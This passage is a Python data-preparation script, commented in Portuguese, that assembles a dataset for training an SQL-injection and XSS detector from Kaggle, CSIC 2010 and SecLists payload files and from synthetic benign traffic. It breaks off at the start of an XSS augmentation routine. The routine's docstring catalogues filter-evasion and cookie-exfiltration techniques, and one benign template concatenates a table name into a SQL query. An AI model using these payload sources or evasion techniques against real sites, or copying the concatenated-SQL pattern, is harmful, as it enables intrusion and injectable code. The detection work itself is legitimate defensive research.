"""
Estágio 1 — Coleta e geração de dados brutos.
Saída: data/interim/01_raw_combined.csv (colunas: payload, label, source)
"""

import os
import random
import warnings
from pathlib import Path

import numpy as np
import pandas as pd
from faker import Faker

warnings.filterwarnings("ignore")

SEED = 42
random.seed(SEED)
np.random.seed(SEED)

BASE_DIR = Path(__file__).parent
RAW_DIR = BASE_DIR / "data" / "raw"
INTERIM_DIR = BASE_DIR / "data" / "interim"
INTERIM_DIR.mkdir(parents=True, exist_ok=True)

OUTPUT_FILE = INTERIM_DIR / "01_raw_combined.csv"

# ---------------------------------------------------------------------------
# Fonte A — Datasets Kaggle
# ---------------------------------------------------------------------------

KAGGLE_FILES = [
    ("sqli_biggest.csv",   "Query",    "sqli"),
    ("sqli_dataset.csv",   "Query",    "sqli"),
    ("xss_dataset.csv",    "Sentence", "xss"),
]


def load_kaggle_files():
    frames = []
    for filename, col, label in KAGGLE_FILES:
        path = RAW_DIR / filename
        if not path.exists():
            print(f"  [AVISO] Arquivo não encontrado, pulando: {path}")
            continue
        for encoding in ("utf-8", "latin-1"):
            try:
                df = pd.read_csv(path, encoding=encoding, on_bad_lines="skip")
                break
            except Exception:
                continue
        else:
            print(f"  [AVISO] Não foi possível ler {filename}, pulando.")
            continue

        if col not in df.columns:
            # tentar encontrar coluna case-insensitive
            match = [c for c in df.columns if c.lower() == col.lower()]
            if match:
                col = match[0]
            else:
                print(f"  [AVISO] Coluna '{col}' não encontrada em {filename}. Colunas: {list(df.columns)}")
                continue

        sub = df[[col]].rename(columns={col: "payload"}).copy()
        sub["label"] = label
        sub["source"] = filename
        sub = sub.dropna(subset=["payload"])
        sub["payload"] = sub["payload"].astype(str)
        frames.append(sub)
        print(f"  [OK] {filename}: {len(sub)} amostras ({label})")

    if not frames:
        print("  [AVISO] Nenhum arquivo Kaggle carregado.")
        return pd.DataFrame(columns=["payload", "label", "source"])
    return pd.concat(frames, ignore_index=True)


# ---------------------------------------------------------------------------
# Fonte B — CSIC 2010
# ---------------------------------------------------------------------------

CSIC_FILES = [
    ("normalTrafficTraining.txt", "benign"),
    ("normalTrafficTest.txt",     "benign"),
    ("anomalousTrafficTest.txt",  "sqli"),
]

HTTP_METHODS = ("GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS")


def parse_csic_file(path: Path, label: str) -> pd.DataFrame:
    """Parser robusto de blocos de requisição HTTP do CSIC 2010."""
    records = []
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
    except Exception as e:
        print(f"  [AVISO] Erro ao abrir {path}: {e}")
        return pd.DataFrame(columns=["payload", "label", "source"])

    i = 0
    while i < len(lines):
        line = lines[i].strip()

        # Identifica início de bloco pelo método HTTP
        if any(line.startswith(m + " ") for m in HTTP_METHODS):
            parts = line.split(" ")
            path_qs = parts[1] if len(parts) > 1 else ""
            content_length = 0
            body = ""

            # Avança pelos headers até linha vazia
            i += 1
            while i < len(lines):
                hline = lines[i].strip()
                if hline == "":
                    i += 1
                    break
                if hline.lower().startswith("content-length:"):
                    try:
                        content_length = int(hline.split(":", 1)[1].strip())
                    except ValueError:
                        content_length = 0
                i += 1

            # Captura body se Content-Length > 0
            if content_length > 0 and i < len(lines):
                body_line = lines[i].strip()
                if body_line:
                    body = body_line
                    i += 1

            payload = (path_qs + " " + body).strip()
            records.append({"payload": payload, "label": label, "source": path.name})
        else:
            i += 1

    df = pd.DataFrame(records)
    print(f"  [OK] {path.name}: {len(df)} amostras ({label})")
    return df


def load_csic_files():
    frames = []
    for filename, label in CSIC_FILES:
        path = RAW_DIR / filename
        if not path.exists():
            print(f"  [AVISO] Arquivo CSIC não encontrado, pulando: {path}")
            continue
        df = parse_csic_file(path, label)
        if not df.empty:
            frames.append(df)

    if not frames:
        print("  [AVISO] Nenhum arquivo CSIC carregado.")
        return pd.DataFrame(columns=["payload", "label", "source"])
    return pd.concat(frames, ignore_index=True)


# ---------------------------------------------------------------------------
# Fonte E — SecLists (XSS e SQLi reais curados pela comunidade)
# ---------------------------------------------------------------------------

SECLISTS_DIR = RAW_DIR / "seclists"

# Arquivos XSS do SecLists — excluir os muito grandes para não dominar
SECLISTS_XSS_FILES = [
    "Fuzzing/XSS/human-friendly/XSS-OFJAAAH.txt",
    "Fuzzing/XSS/human-friendly/XSS-payloadbox.txt",
    "Fuzzing/XSS/human-friendly/XSS-With-Context-Jhaddix.txt",
    "Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt",
    "Fuzzing/XSS/human-friendly/XSS-Vectors-Mario.txt",
    "Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt",
    "Fuzzing/XSS/human-friendly/XSS-RSNAKE.txt",
    "Fuzzing/XSS/human-friendly/XSS-Somdev.txt",
    "Fuzzing/XSS/human-friendly/XSS-innerht-ml.txt",
    "Fuzzing/XSS/human-friendly/XSS-Bypass-Strings-BruteLogic.txt",
    "Fuzzing/XSS/Polyglots/XSS-Polyglots.txt",
    "Fuzzing/XSS/Polyglots/XSS-Polyglots-Dmiessler.txt",
    "Fuzzing/XSS/Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt",
    "Fuzzing/XSS/robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
    "Fuzzing/XSS/robot-friendly/XSS-EnDe-evation.txt",
    "Fuzzing/XSS/robot-friendly/XSS-EnDe-h4k.txt",
    "Fuzzing/XSS/robot-friendly/XSS-EnDe-mario.txt",
    "Fuzzing/XSS/robot-friendly/XSS-EnDe-xssAttacks.txt",
    "Fuzzing/XSS/robot-friendly/XSS-Vectors-Mario.txt",
    "Fuzzing/URI-XSS.fuzzdb.txt",
    "Fuzzing/HTML5sec-Injections-Jhaddix.txt",
]

SECLISTS_SQLI_FILES = [
    "Fuzzing/Databases/SQLi/Generic-SQLi.txt",
    "Fuzzing/Databases/SQLi/Generic-BlindSQLi.fuzzdb.txt",
    "Fuzzing/Databases/SQLi/MSSQL.fuzzdb.txt",
    "Fuzzing/Databases/SQLi/MySQL-SQLi-Login-Bypass.fuzzdb.txt",
    "Fuzzing/Databases/SQLi/MySQL.fuzzdb.txt",
    "Fuzzing/Databases/SQLi/Oracle.fuzzdb.txt",
    "Fuzzing/Databases/SQLi/quick-SQLi.txt",
    "Fuzzing/Databases/SQLi/SQLi-Polyglots.txt",
    "Fuzzing/Databases/SQLi/sqli.auth.bypass.txt",
]


def load_seclists() -> pd.DataFrame:
    """
    Carrega payloads reais de ataque do SecLists (XSS + SQLi).
    Filtra linhas vazias, comentários e duplicatas.
    Limita XSS a 20.000 amostras para não criar desequilíbrio excessivo.
    """
    if not SECLISTS_DIR.exists():
        print("  [AVISO] SecLists não encontrado em data/raw/seclists — pulando.")
        print("  [INFO]  Execute: git clone --depth=1 --filter=blob:none --sparse")
        print("          https://github.com/danielmiessler/SecLists data/raw/seclists")
        return pd.DataFrame(columns=["payload", "label", "source"])

    frames = []

    def _read_file(rel_path: str, label: str) -> list[str]:
        p = SECLISTS_DIR / rel_path
        if not p.exists():
            return []
        payloads = []
        for encoding in ("utf-8", "latin-1"):
            try:
                with open(p, encoding=encoding, errors="replace") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            payloads.append(line)
                break
            except Exception:
                continue
        return payloads

    # --- XSS ---
    xss_payloads = []
    for rel_path in SECLISTS_XSS_FILES:
        lines = _read_file(rel_path, "xss")
        if lines:
            xss_payloads.extend(lines)
            print(f"  [OK] SecLists XSS {Path(rel_path).name}: {len(lines)} payloads")

    xss_payloads = list(dict.fromkeys(xss_payloads))  # dedup preservando ordem
    random.seed(SEED)
    if len(xss_payloads) > 20000:
        xss_payloads = random.sample(xss_payloads, 20000)

    if xss_payloads:
        df_xss = pd.DataFrame({
            "payload": xss_payloads,
            "label": "xss",
            "source": "seclists_xss",
        })
        frames.append(df_xss)
        print(f"  [OK] SecLists XSS total (após dedup/sample): {len(df_xss)}")

    # --- SQLi ---
    sqli_payloads = []
    for rel_path in SECLISTS_SQLI_FILES:
        lines = _read_file(rel_path, "sqli")
        if lines:
            sqli_payloads.extend(lines)
            print(f"  [OK] SecLists SQLi {Path(rel_path).name}: {len(lines)} payloads")

    sqli_payloads = list(dict.fromkeys(sqli_payloads))
    if sqli_payloads:
        df_sqli = pd.DataFrame({
            "payload": sqli_payloads,
            "label": "sqli",
            "source": "seclists_sqli",
        })
        frames.append(df_sqli)
        print(f"  [OK] SecLists SQLi total (após dedup): {len(df_sqli)}")

    if not frames:
        print("  [AVISO] Nenhum arquivo SecLists carregado.")
        return pd.DataFrame(columns=["payload", "label", "source"])

    return pd.concat(frames, ignore_index=True)


# ---------------------------------------------------------------------------
# Fonte C — Geração sintética de tráfego legítimo ambíguo
# ---------------------------------------------------------------------------

def _hex_color() -> str:
    """Gera cor hexadecimal aleatória para templates SVG legítimos."""
    return format(random.randint(0, 0xFFFFFF), "06X")


def build_synthetic_legit(n=15000) -> pd.DataFrame:
    """
    Gera tráfego legítimo ambíguo para controlar FPR.
    Cobre padrões que tipicamente causam falsos positivos.
    Inclui templates em Português, Espanhol e Inglês.
    """
    fake = Faker("pt_BR")
    fake_en = Faker("en_US")
    Faker.seed(SEED)

    # Palavras SQL em contexto legítimo
    sql_words = ["SELECT", "WHERE", "UNION", "DROP", "INSERT", "UPDATE", "DELETE",
                 "select", "where", "union", "drop", "insert", "update", "delete"]
    # Tags HTML legítimas
    html_tags = ["<b>", "<p>", "<h1>", "<div>", "<span>", "<em>", "<strong>",
                 "<ul>", "<li>", "<table>", "<tr>", "<td>"]
    # Nomes com apóstrofe
    names_apos = ["O'Brien", "D'Almeida", "O'Connor", "L'Oréal", "D'Angelo",
                  "O'Neil", "D'Souza", "O'Hara", "L'Arc", "D'Costa"]
    # Event handlers em contexto de config
    event_params = ["onload=false", "onerror=retry", "onclick=disabled",
                    "onchange=notify", "onsubmit=validate", "onerror=ignore"]
    # Parâmetros booleanos ambíguos
    bool_params = ["union=true", "select_all=false", "drop=false", "exec=false",
                   "exec=concluido", "select=none", "update=pending", "delete=false"]
    # Diagnósticos / termos técnicos
    tech_terms = ["exec_AB12", "codigo=exec_AB12", "exec_report", "cast_iron",
                  "convert_pdf", "sleep_mode", "benchmark_test", "union_find",
                  "drop_down", "select_option", "script_tag", "alert_level"]

    templates = [
        # 1 — Apóstrofes em nomes próprios
        lambda: f"nome={random.choice(names_apos)}&acao=buscar",
        lambda: f"search={random.choice(names_apos)}+{fake.last_name()}",
        lambda: f"autor={random.choice(names_apos)}&titulo={fake.sentence(nb_words=4)}",
        lambda: f"cliente={random.choice(names_apos)}&cpf={fake.cpf()}",
        lambda: f"q={random.choice(names_apos)}+livros",

        # 2 — Palavras SQL em contexto legítimo
        lambda: f"q={random.choice(sql_words)}+tutorial+{fake.word()}",
        lambda: f"search=como+usar+{random.choice(sql_words)}+em+banco+de+dados",
        lambda: f"titulo={random.choice(sql_words)}+avancado+{fake.word()}",
        lambda: f"descricao=aprenda+{random.choice(sql_words)}+do+zero",
        lambda: f"tag={random.choice(sql_words).lower()}&categoria=programacao",
        lambda: f"busca={random.choice(sql_words)}+{fake.word()}+exemplos+praticos",
        lambda: f"q=diferenca+entre+{random.choice(sql_words)}+e+{random.choice(sql_words).lower()}",

        # 3 — HTML legítimo em campos de conteúdo (CMS/editor)
        lambda: f"conteudo={random.choice(html_tags)}{fake.sentence()}</p>",
        lambda: f"body={random.choice(html_tags)}{fake.sentence()}{random.choice(html_tags)}",
        lambda: f"descricao=<p>{fake.paragraph(nb_sentences=2)}</p>",
        lambda: f"texto=<b>{fake.name()}</b>+escreveu:+{fake.sentence()}",
        lambda: f"html_content=<div+class='container'>{fake.sentence()}</div>",
        lambda: f"resumo=<h1>{fake.catch_phrase()}</h1><p>{fake.sentence()}</p>",

        # 4 — Palavra "script" em contexto legítimo
        lambda: f"arquivo={fake.word()}.js&tipo=script",
        lambda: f"script_name={fake.word()}_v{random.randint(1,5)}.js",
        lambda: f"config=script_timeout:{random.randint(1000,9000)}",
        lambda: f"path=/assets/scripts/{fake.word()}.min.js",
        lambda: f"modulo=script_runner&acao=listar",

        # 5 — Parâmetros booleanos ambíguos
        lambda: f"{random.choice(bool_params)}&pagina={random.randint(1,100)}",
        lambda: f"modo=avancado&{random.choice(bool_params)}",
        lambda: f"{random.choice(bool_params)}&usuario={fake.user_name()}",
        lambda: f"acao=processar&{random.choice(bool_params)}&id={random.randint(1,999)}",

        # 6 — Event handlers em contexto legítimo de config
        lambda: f"{random.choice(event_params)}&modulo={fake.word()}",
        lambda: f"config={random.choice(event_params)}&nivel=info",
        lambda: f"handler={random.choice(event_params)}&timeout={random.randint(100,5000)}",

        # 7 — Encoding em URLs normais
        lambda: f"/api/v1/usuarios/{fake.user_name().replace(' ','%20')}/perfil",
        lambda: f"/busca?q={fake.word()}%20{fake.word()}&pagina={random.randint(1,10)}",
        lambda: f"/download?arquivo={fake.word()}%2F{fake.word()}.pdf",
        lambda: f"/path/{fake.word()}%20{fake.word()}%2F{fake.word()}",

        # 8 — Campos de senha/token sem payload real
        lambda: f"usuario={fake.user_name()}&senha=***&acao=login",
        lambda: f"token={fake.uuid4()}&acao=autenticar",
        lambda: f"api_key={fake.uuid4()}&recurso=dados",
        lambda: f"bearer={fake.uuid4()}&endpoint=/api/v1/{fake.word()}",

        # 9 — Comentários de usuário com pontuação
        lambda: f"comentario={fake.sentence()},+{fake.sentence()}",
        lambda: f"review={fake.name()}+disse:+\"{fake.sentence()}\"",
        lambda: f"feedback={fake.paragraph(nb_sentences=1)}",
        lambda: f"observacao={fake.sentence()}+--+{fake.name()}",

        # 10 — Paths de API REST
        lambda: f"/api/v{random.randint(1,3)}/{fake.word()}/{random.randint(1,9999)}",
        lambda: f"/admin/report?month={random.randint(1,12)}&year={random.randint(2020,2026)}",
        lambda: f"/api/v1/{fake.word()}/{fake.word()}?limit={random.randint(10,100)}&offset={random.randint(0,500)}",
        lambda: f"GET /api/v1/users/{random.randint(1,9999)}/orders HTTP/1.1",

        # 11 — Dados de produto e e-commerce
        lambda: f"sku={fake.bothify('??-####')}&preco={random.uniform(10,999):.2f}&categoria={fake.word()}",
        lambda: f"produto={fake.catch_phrase()}&descricao={fake.sentence()}&estoque={random.randint(0,500)}",
        lambda: f"item_id={random.randint(1000,9999)}&nome={fake.word()}&qtd={random.randint(1,50)}",
        lambda: f"pedido={random.randint(10000,99999)}&status=processando&total={random.uniform(50,5000):.2f}",

        # 12 — Termos técnicos inocentes
        lambda: f"codigo={random.choice(tech_terms)}&status=ok",
        lambda: f"tarefa={random.choice(tech_terms)}&prioridade={random.choice(['alta','media','baixa'])}",
        lambda: f"diagnostico=cast_iron_nivel_{random.randint(1,5)}&resultado=normal",
        lambda: f"operacao=convert_pdf&arquivo={fake.word()}.docx&destino={fake.word()}.pdf",
        lambda: f"modo=benchmark_test&iteracoes={random.randint(100,10000)}",
        lambda: f"exec={random.choice(['concluido','pendente','falhou'])}&job_id={str(fake.uuid4())[:8]}",

        # Extras para volume e diversidade
        lambda: f"usuario={fake.user_name()}&email={fake.email()}&acao=atualizar",
        lambda: f"q={fake.sentence(nb_words=3)}&tipo=produto&ordenar=preco",
        lambda: f"id={random.randint(1,99999)}&formato=json&campos=todos",
        lambda: f"filtro=categoria:{fake.word()};preco:0-{random.randint(100,1000)}",
        lambda: f"GET /{fake.word()}/{fake.word()}?{fake.word()}={random.randint(1,100)} HTTP/1.1",
        lambda: f"data_inicio={fake.date()}&data_fim={fake.date()}&relatorio=mensal",
        lambda: f"pagina={random.randint(1,50)}&itens_por_pagina={random.choice([10,20,50,100])}",
        lambda: f"upload=true&arquivo={fake.file_name()}&tamanho={random.randint(1024,10485760)}",
        lambda: f"lang=pt-BR&timezone=America/Sao_Paulo&tema=escuro",
        lambda: f"nivel=INFO&mensagem={fake.sentence()}&componente={fake.word()}",

        # 13 — English login / authentication forms
        lambda: f"username={fake_en.user_name()}&password={fake_en.password(length=10)}",
        lambda: f"username={fake_en.user_name()}&password={fake_en.password()}&remember=true",
        lambda: f"login={fake_en.user_name()}&pass={fake_en.password(length=8)}&action=login",
        lambda: f"email={fake_en.email()}&password={fake_en.password()}",
        lambda: f"user={fake_en.user_name()}&pwd={fake_en.password(length=10)}&keep_logged=false",
        lambda: f"username={fake_en.first_name().lower()}.{fake_en.last_name().lower()}&password=Senha{random.randint(100,999)}",
        lambda: f"email={fake_en.email()}&password=Pass{random.randint(1000,9999)}!&csrf_token={fake_en.uuid4()[:16]}",

        # 14 — English numeric ID parameters (o padrão que mais causou FP)
        lambda: f"id={random.randint(1, 99999)}",
        lambda: f"id={random.randint(1, 9999)}&format=json",
        lambda: f"id={random.randint(1, 9999)}&page={random.randint(1, 50)}",
        lambda: f"id={random.randint(1, 9999)}&action=view",
        lambda: f"user_id={random.randint(1, 99999)}&status=active",
        lambda: f"user_id={random.randint(1, 99999)}&role=member",
        lambda: f"item_id={random.randint(1, 9999)}&action=view",
        lambda: f"item_id={random.randint(1, 9999)}&qty={random.randint(1, 10)}",
        lambda: f"product_id={random.randint(100, 9999)}&action=detail",
        lambda: f"order_id={random.randint(10000, 99999)}&status=pending",
        lambda: f"post_id={random.randint(1, 9999)}&comment_id={random.randint(1, 500)}",
        lambda: f"record_id={random.randint(1, 9999)}&format=json",

        # 15 — English search and filtering
        lambda: f"q={fake_en.word()}&category={fake_en.word()}",
        lambda: f"search={fake_en.first_name()}+{fake_en.last_name()}&page=1",
        lambda: f"query={fake_en.word()}+{fake_en.word()}&sort=relevance",
        lambda: f"keyword={fake_en.word()}+{fake_en.word()}&lang=en",
        lambda: f"q={fake_en.word()}&type=product&sort=price_asc",
        lambda: f"search={fake_en.catch_phrase()}&results=20",
        lambda: f"filter=status:active&sort=created_at&page={random.randint(1, 10)}",
        lambda: f"q={fake_en.word()}&category={fake_en.word()}&min_price={random.randint(10,100)}&max_price={random.randint(200,1000)}",

        # 16 — English user profile / registration
        lambda: f"first_name={fake_en.first_name()}&last_name={fake_en.last_name()}&email={fake_en.email()}",
        lambda: f"name={fake_en.name()}&email={fake_en.email()}&phone={fake_en.phone_number()}",
        lambda: f"username={fake_en.user_name()}&email={fake_en.email()}&action=register",
        lambda: f"first_name={fake_en.first_name()}&last_name={fake_en.last_name()}&age={random.randint(18, 80)}",
        lambda: f"company={fake_en.company()}&department={fake_en.job()}&employee_id={random.randint(1000, 9999)}",

        # 17 — English e-commerce / cart
        lambda: f"product={fake_en.word()}&price={random.uniform(10, 999):.2f}&qty={random.randint(1, 10)}",
        lambda: f"item={fake_en.word()}&color={fake_en.color_name()}&size={random.choice(['XS','S','M','L','XL'])}",
        lambda: f"cart_id={fake_en.uuid4()[:12]}&action=checkout",
        lambda: f"sku={fake_en.bothify('??-####')}&quantity={random.randint(1,50)}&warehouse=main",
        lambda: f"product_name={fake_en.word()}&stock={random.randint(0,500)}&price={random.uniform(5,500):.2f}",

        # 18 — English pagination and listing
        lambda: f"page={random.randint(1, 50)}&per_page={random.choice([10, 20, 50, 100])}",
        lambda: f"limit={random.randint(10, 100)}&offset={random.randint(0, 500)}&order=asc",
        lambda: f"page={random.randint(1, 20)}&sort=name&direction=asc",
        lambda: f"rows={random.randint(10, 50)}&start={random.randint(0, 200)}&search={fake_en.word()}",
        lambda: f"page_size={random.choice([5, 10, 25, 50])}&page_num={random.randint(1, 100)}",

        # 19 — English REST API paths with IDs
        lambda: f"/api/v{random.randint(1,3)}/users/{random.randint(1,9999)}/profile",
        lambda: f"/api/v1/products/{random.randint(1,9999)}?format=json",
        lambda: f"/api/v2/orders/{random.randint(10000,99999)}/status",
        lambda: f"GET /api/v1/users/{random.randint(1,9999)} HTTP/1.1",
        lambda: f"GET /api/v1/items/{random.randint(1,9999)}?include=details HTTP/1.1",
        lambda: f"/users/{random.randint(1,9999)}/settings?tab=security",
        lambda: f"/products/{random.randint(1,9999)}/reviews?page={random.randint(1,10)}",

        # 20 — English system / config / technical
        lambda: f"debug=false&env=production&version=1.{random.randint(0,9)}.{random.randint(0,9)}",
        lambda: f"format=json&api_version=v2&include=metadata",
        lambda: f"lang=en&locale=en_US&timezone=UTC",
        lambda: f"timezone=America/New_York&date_format=MM-DD-YYYY",
        lambda: f"status=active&verified=true&role=user",
        lambda: f"action=update&id={random.randint(1,9999)}&status=active",
        lambda: f"action=view&id={random.randint(1,9999)}&format=json",
        lambda: f"method=GET&resource=users&id={random.randint(1,9999)}",
        lambda: f"type=report&month={random.randint(1,12)}&year={random.randint(2020,2026)}&format=pdf",

        # 21 — Prosa natural PT com vocabulário SQL em contexto educacional/profissional
        lambda: f"tenho experiencia com {random.choice(['select', 'insert', 'update', 'delete'])} em banco de dados",
        lambda: f"aprendi a fazer selects no curso de {fake.word()} ontem",
        lambda: f"fiz alguns selects para buscar os dados das tabelas",
        lambda: f"o comando select retorna os dados onde a condicao é verdadeira",
        lambda: f"uso o where para filtrar resultados no banco de {fake.word()}",
        lambda: f"preciso de ajuda com o select from where no meu projeto",
        lambda: f"quando uso union em queries relacionais preciso cuidar dos tipos",
        lambda: f"fiz um drop down com as opcoes do banco de dados",
        lambda: f"o insert into foi bem sucedido e o registro foi salvo",
        lambda: f"o update na tabela de {fake.word()} atualizou {random.randint(1,100)} linhas",
        lambda: f"nao consigo entender a diferenca entre delete e truncate",
        lambda: f"tenho um script python que executa queries no banco",
        lambda: f"uso o alert do sistema para notificar erros de {fake.word()}",

        # 22 — Prosa natural EN com vocabulário SQL em contexto técnico legítimo
        lambda: f"i did some selects to get the data from the tables",
        lambda: f"learned about select from where clauses in my database class today",
        lambda: f"the query uses a {random.choice(['select', 'where', 'from', 'join'])} clause to filter results",
        lambda: f"ive done some selects on the {fake_en.word()} table for the report",
        lambda: f"working with select statements and where conditions in my project",
        lambda: f"how to use {random.choice(['union', 'join', 'select'])} properly in SQL",
        lambda: f"the delete operation removed {random.randint(1, 500)} records from {fake_en.word()}",
        lambda: f"writing a script to automate the {fake_en.word()} insert process",
        lambda: f"i need help with the select from where query in my assignment",
        lambda: f"using alert in javascript to debug my {fake_en.word()} application",
        lambda: f"the script runs every {random.randint(1,24)} hours to update the records",
        lambda: f"drop the unused columns from the {fake_en.word()} dataframe",
        lambda: f"studying SQL joins and select statements in computer science",

        # 23 — XML e SVG legítimos sem scripts
        lambda: f'<?xml version="1.0" encoding="UTF-8"?><root><item id="{random.randint(1,999)}">{fake.word()}</item></root>',
        lambda: f'<?xml version="1.0" standalone="no"?><data><record>{fake.name()}</record></data>',
        lambda: f'<svg xmlns="http://www.w3.org/2000/svg" width="{random.randint(100,800)}" height="{random.randint(100,600)}"><rect width="100%" height="100%" fill="#{_hex_color()}"/></svg>',
        lambda: f'<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"><circle cx="{random.randint(10,200)}" cy="{random.randint(10,200)}" r="{random.randint(5,100)}" fill="#{_hex_color()}"/></svg>',
        lambda: f'<svg xmlns="http://www.w3.org/2000/svg"><polygon points="{random.randint(0,50)},{random.randint(0,50)} {random.randint(50,100)},{random.randint(0,50)} {random.randint(0,100)},{random.randint(50,100)}" fill="#{_hex_color()}"/></svg>',
        lambda: f'<?xml version="1.0"?><config><param name="{fake.word()}" value="{random.randint(1,100)}"/><param name="{fake.word()}" value="{fake.word()}"/></config>',
        lambda: f'<!DOCTYPE html><html lang="pt-BR"><head><title>{fake.catch_phrase()}</title></head><body><p>{fake.sentence()}</p></body></html>',
        lambda: f'<svg xmlns="http://www.w3.org/2000/svg"><text x="{random.randint(10,100)}" y="{random.randint(10,100)}" font-size="{random.randint(10,40)}">{fake.word()}</text></svg>',
        lambda: f'<feed xmlns="http://www.w3.org/2005/Atom"><title>{fake.catch_phrase()}</title><entry><title>{fake.sentence()}</title></entry></feed>',
        lambda: f'<?xml version="1.0"?><rss version="2.0"><channel><title>{fake.catch_phrase()}</title><description>{fake.sentence()}</description></channel></rss>',

        # 24 — Código e documentação técnica legítima
        lambda: f"function {fake_en.word()}() {{ return document.getElementById('{fake_en.word()}').value; }}",
        lambda: f"const {fake_en.word()} = document.querySelector('#{fake_en.word()}');",
        lambda: f"// TODO: refactor the {fake_en.word()} alert to use a toast notification",
        lambda: f"console.log('debug: {fake_en.word()} loaded successfully');",
        lambda: f"var {fake_en.word()} = document.getElementsByClassName('{fake_en.word()}')[0];",
        lambda: f"document.title = '{fake.catch_phrase()}';",
        lambda: f"window.location.href = '/dashboard?id={random.randint(1,9999)}';",
        lambda: f"# python script para processar dados de {fake.word()} com pandas",
        lambda: f"import pandas as pd; df = pd.read_csv('{fake.word()}.csv')",
        lambda: f"def select_{fake_en.word()}(conn, table): return conn.execute('SELECT * FROM ' + table)",

        # 25 — Conteúdo de formulários ricos (CMS, blog, fórum)
        lambda: f"Olá, tenho uma dúvida sobre como usar o alert() em javascript sem ser bloqueado",
        lambda: f"Como faço um script bash que lê um arquivo e insere no banco de dados?",
        lambda: f"Alguém sabe como usar o SELECT INTO para copiar dados entre tabelas?",
        lambda: f"Preciso de ajuda: meu script de backup está dando erro no delete from",
        lambda: f"Qual a diferença entre document.write e innerHTML no javascript?",
        lambda: f"How do I use alert() properly in my JavaScript form validation?",
        lambda: f"My SQL query with SELECT FROM WHERE is returning unexpected results",
        lambda: f"Looking for help with my Python script that does database selects",
        lambda: f"Can someone explain how UNION works in SQL for combining query results?",
        lambda: f"Best practices for using document.getElementById in vanilla javascript",
    ]

    # Garantir mínimo de 40 templates
    assert len(templates) >= 40, f"Menos de 40 templates: {len(templates)}"
    print(f"  [INFO] Templates sintéticos disponíveis: {len(templates)}")

    records = []
    for _ in range(n):
        t = random.choice(templates)
        try:
            payload = t()
        except Exception:
            payload = fake.sentence()
        records.append({"payload": str(payload), "label": "benign", "source": "synthetic_legit"})

    df = pd.DataFrame(records)
    print(f"  [OK] Sintético legítimo: {len(df)} amostras geradas")
    return df


# ---------------------------------------------------------------------------
# Fonte D — Augmentação XSS baseada em técnicas documentadas
# ---------------------------------------------------------------------------

def build_xss_augmented(n: int = 100_000) -> pd.DataFrame:
    """
    Gera payloads XSS augmentados a partir de seeds de ataques reais documentados.

    Motivação: o dataset Kaggle XSS (~11 k amostras) cobre apenas padrões básicos
    (<script>, <img onerror>). Técnicas reais de evasão de WAF — encoding, mutation
    XSS, HTML5 handlers, URI wrappers — estão sistematicamente ausentes, causando
    subrepresentação do token-space XSS no TF-IDF.

    Metodologia de augmentação
    --------------------------
    Cada categoria possui um conjunto de templates parametrizáveis.  O parâmetro
    ``f`` recebe uma função JS da lista JS_FUNCS; templates com payload fixo
    simplesmente ignoram ``f``.  Para cada iteração, sorteia-se aleatoriamente
    um template e uma função JS, gerando diversidade sem repetição literal.

    Categorias e referências
    ------------------------
    1. Script tag básico
       Ref: PortSwigger XSS Cheat Sheet (set. 2019)
    2. Tags quebradas / aninhadas (filter evasion)
       Ref: Bypassing Signature-Based XSS Filters (PortSwigger, ago. 2020)
            mXSS Attacks — Heiderich, Schwenk, Frosch, Magazinius, Yang (set. 2013)
    3. Encoding bypasses (Unicode, HTML entities, hex, URL-encoding)
       Ref: Xssing Web With Unicodes — Rakesh Mane (ago. 2017)
            Encoding Differentials: Why Charset Matters — Stefan Schiller (jul. 2024)
    4. IMG event handlers
       Ref: PortSwigger XSS Cheat Sheet (set. 2019)
    5. SVG payloads
       Ref: PortSwigger XSS Cheat Sheet (set. 2019); Short SVG Payloads (noraj)
    6. HTML5 tags com event handlers não-óbvios
       Ref: PortSwigger XSS Cheat Sheet (set. 2019)
            Ways to alert(document.domain) — Tom Hudson (@tomnomnom, fev. 2018)
    7. Div / pointer events
       Ref: PortSwigger XSS Cheat Sheet (set. 2019)
    8. URI wrappers (javascript:, data:, encodings do esquema)
       Ref: Twitter XSS via javascript scheme — Sergey Bobrov (set. 2017)
            XSS in Wrappers for URI — PortSwigger XSS Cheat Sheet (set. 2019)
    9. Data grabbers (exfiltração de cookie / localStorage)
       Ref: XSS by Tossing Cookies — WeSecureApp (jul. 2017)
            XSS in Uber via Cookie — zhchbin (ago. 2017)
   10. Mutation XSS (mXSS)
       Ref: Write-up of DOMPurify 2.0.0 bypass — Michał Bentkowski (set. 2019)
            mXSS Attacks — Heiderich et al. (set. 2013)
            Mutation XSS in Google Search — Tomasz Andrzej Nidecki (abr. 2019)
   11. Polyglot payloads
       Ref: Unleashing an Ultimate XSS Polyglot — Ahmed Elsobky (fev. 2018)
            XSS ghettoBypass — d3adend (set. 2015)
   12. JS context escapes
       Ref: PortSwigger XSS Cheat Sheet (set. 2019)
    """
    random.seed(SEED)
    import string as _string

    # ------------------------------------------------------------------
    # Helpers de variação aleatória
    # Cada chamada produz um valor diferente, garantindo unicidade entre
    # amostras geradas pelo mesmo template.
    # ------------------------------------------------------------------
    def _r(k: int = 4) -> str:
        """String alfanumérica aleatória de comprimento k."""
        return "".join(random.choices(_string.ascii_lowercase + _string.digits, k=k))

    def _ri(lo: int = 1, hi: int = 9999) -> int:
        """Inteiro aleatório no intervalo [lo, hi]."""
        return random.randint(lo, hi)

    # Nomes de parâmetros HTTP comuns usados como contexto de injeção.
    # Simulam campos reais de formulários e query strings onde XSS ocorre.
    _PARAM_NAMES = [
        "q", "search", "name", "input", "value", "data", "text",
        "comment", "message", "title", "content", "body", "redirect",
        "url", "ref", "src", "href", "page", "next", "return",
    ]

    def _ctx(payload: str) -> str:
        """
        Envolve o payload em contexto HTTP realista com 60% de probabilidade.
        Simula os vetores de injeção mais comuns: query string, form field,
        path segment e header value.
        Ref: Blind XSS endpoint categories — PortSwigger XSS Cheat Sheet (2019)
        """
        if random.random() > 0.60:
            return payload
        kind = random.choice(["qs", "form", "path", "raw"])
        p = random.choice(_PARAM_NAMES)
        n2 = random.choice(_PARAM_NAMES)
        v = _ri()
        if kind == "qs":
